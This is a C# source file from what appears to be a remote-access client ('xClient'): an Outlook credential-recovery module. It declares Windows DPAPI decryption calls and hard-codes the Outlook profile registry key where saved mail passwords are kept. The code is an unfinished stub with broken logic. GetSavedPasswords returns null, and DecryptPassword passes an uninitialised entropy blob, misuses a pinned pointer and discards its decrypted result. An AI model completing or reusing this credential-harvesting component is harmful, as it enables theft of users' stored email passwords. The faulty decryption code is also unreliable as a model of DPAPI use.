using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using xClient.Core.Data;
using xClient.Core.Recovery.Utilities;

namespace xClient.Core.Recovery.Other
{
    public static class Outlook
    {
        [Flags]
        public enum CryptProtectFlags
        {
            // for remote-access situations where ui is not an option
            // if UI was specified on protect or unprotect operation, the call
            // will fail and GetLastError() will indicate ERROR_PASSWORD_RESTRICTION
            CRYPTPROTECT_UI_FORBIDDEN = 0x1,

            // per machine protected data -- any user on machine where CryptProtectData
            // took place may CryptUnprotectData
            CRYPTPROTECT_LOCAL_MACHINE = 0x4,

            // force credential synchronize during CryptProtectData()
            // Synchronize is only operation that occurs during this operation
            CRYPTPROTECT_CRED_SYNC = 0x8,

            // Generate an Audit on protect and unprotect operations
            CRYPTPROTECT_AUDIT = 0x10,

            // Protect data with a non-recoverable key
            CRYPTPROTECT_NO_RECOVERY = 0x20,


            // Verify the protection of a protected blob
            CRYPTPROTECT_VERIFY_PROTECTION = 0x40
        }

        [Flags]
        private enum CryptProtectPromptFlags
        {
            // prompt on unprotect
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 0x1,

            // prompt on protect
            CRYPTPROTECT_PROMPT_ON_PROTECT = 0x2
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public unsafe struct DataBlob
        {
            public int cbData;
            public byte* pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct CryptprotectPromptstruct
        {
            int cbSize;
            CryptProtectPromptFlags dwPromptFlags;
            IntPtr hwndApp;
            String szPrompt;
        }

        [DllImport("Crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptProtectData(
            ref DataBlob pDataIn,
            string szDataDescr,
            ref DataBlob pOptionalEntropy,
            IntPtr pvReserved,
            ref CryptprotectPromptstruct pPromptStruct,
            CryptProtectFlags dwFlags,
            ref DataBlob pDataOut
            );

        [DllImport("Crypt32.dll")]
        private unsafe static extern bool CryptUnprotectData(
            DataBlob* pDataIn,
            String szDataDescr,
            DataBlob* pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            uint dwFlags,
            DataBlob* pDataOut
            );

        private const string BASE_KEY =
            @"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\00000002";

        public static List<RecoveredAccount> GetSavedPasswords()
        {

            return null;
        }

        private static unsafe string DecryptPassword(byte[] passData)
        {
            DataBlob encrypted, decrypted, entropy;
            CryptprotectPromptstruct b = new CryptprotectPromptstruct();

            fixed (byte* pEnc = passData)
                encrypted.pbData = pEnc;
            encrypted.cbData = passData.Length;

            if (CryptUnprotectData(&encrypted, null, &entropy, IntPtr.Zero, IntPtr.Zero,
                0,
                &decrypted))
            {
                return "";
            }


            return null;
        }
    }
}
